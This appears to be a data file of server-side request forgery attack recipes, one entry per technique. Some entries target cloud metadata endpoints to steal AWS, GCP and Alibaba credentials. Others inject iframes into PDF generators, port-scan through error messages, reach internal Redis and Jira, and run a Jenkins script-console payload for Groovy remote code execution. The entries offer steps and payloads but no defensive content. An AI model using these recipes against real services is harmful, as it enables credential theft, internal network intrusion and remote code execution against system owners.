title: SSRF via webhook URL to AWS metadata
desc: Webhook feature fetched user-supplied URLs server-side. Pointing at 169.254.169.254 leaked AWS IAM credentials.
steps:
1. Create webhook with URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/
2. Trigger webhook
3. Response contains IAM role credentials

title: SSRF via PDF generator to internal services
desc: PDF export rendered HTML from user input. Injecting iframe pointing to internal IPs read internal service responses.
steps:
1. Find PDF/screenshot generation feature
2. Inject: <iframe src="http://192.168.1.1/admin">
3. Generated PDF contains internal page content

title: SSRF via image import URL to GCP metadata
desc: Product image import feature fetched URLs server-side. GCP metadata endpoint returned service account tokens.
steps:
1. Use product image import with URL: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
2. Import triggers server-side fetch
3. Response contains GCP service account token

title: SSRF via link preview fetcher
desc: Link preview feature fetched URLs to generate previews. Internal network services accessible via 192.168.x.x ranges.
steps:
1. Post message with URL pointing to internal IP
2. Slack fetches URL for preview
3. Internal service response visible in preview or error

title: SSRF via video thumbnail URL parameter
desc: Video thumbnail generation accepted external URLs. Server fetched the URL, allowing access to internal services.
steps:
1. Find thumbnail generation endpoint
2. Supply internal IP as thumbnail URL
3. Server fetches internal resource

title: SSRF to RCE via internal Jenkins
desc: SSRF reached internal Jenkins instance on port 8080. Jenkins had script console enabled, allowing Groovy RCE.
steps:
1. Confirm SSRF to internal network
2. Scan for Jenkins: http://10.0.0.x:8080/
3. Access /script console
4. Execute Groovy: Runtime.exec('id')
payload:
# SSRF to Jenkins script console
http://10.0.0.5:8080/script
# POST: script=Runtime.getRuntime().exec('id').text

title: SSRF via external storage URL
desc: External storage configuration accepted server-side URLs. Pointing to internal services exposed internal HTTP responses.
steps:
1. Configure external storage with internal URL
2. Browse the storage
3. Internal service response returned as file listing

title: SSRF via datasource URL to internal services
desc: Grafana datasource configuration fetched the configured URL server-side. Internal services accessible by configuring a datasource pointing to internal IPs.
steps:
1. Add new datasource with URL: http://127.0.0.1:9200
2. Click 'Save & Test'
3. Grafana fetches internal Elasticsearch — response visible

title: SSRF via image URL import — internal port scan
desc: Image import by URL allowed scanning internal ports. Different error messages for open vs closed ports enabled port enumeration.
steps:
1. Import image from http://127.0.0.1:22/ — note error
2. Import from http://127.0.0.1:9999/ — different error
3. Enumerate open ports via error message differences

title: SSRF via macro URL to internal Jira
desc: Confluence macro fetched external URLs for content embedding. Internal Jira instance accessible via SSRF.
steps:
1. Create page with URL macro pointing to internal Jira
2. Confluence fetches internal Jira
3. Jira API response embedded in page

title: SSRF via Alibaba Cloud metadata endpoint
desc: SSRF vulnerability reached Alibaba Cloud metadata service, leaking RAM role credentials.
steps:
1. Exploit SSRF to reach: http://100.100.100.200/latest/meta-data/
2. Enumerate RAM roles
3. Fetch credentials

title: SSRF via webhook to internal Redis
desc: Webhook URL was fetched server-side. Pointing to internal Redis port 6379 allowed sending Redis commands via HTTP.
steps:
1. Set webhook URL to: http://127.0.0.1:6379/
2. Trigger webhook with crafted body
3. Redis interprets HTTP request as commands
